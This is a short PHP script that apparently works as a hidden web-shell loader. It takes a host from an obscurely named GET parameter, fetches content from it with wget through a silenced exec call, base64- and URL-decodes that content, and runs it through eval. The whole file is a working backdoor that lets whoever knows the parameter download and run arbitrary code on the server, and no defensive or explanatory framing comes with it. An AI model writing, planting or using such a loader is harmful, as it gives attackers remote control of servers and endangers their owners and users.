<?php
$x = 'http://'.$_GET['ahqix4wv81urfm'];
@exec("wget $x -qO-", $q);
$d = base64_decode($q[0]);
$a = urldecode($d);
$y = '?>';
$r = $y.$a;
eval($r);
?>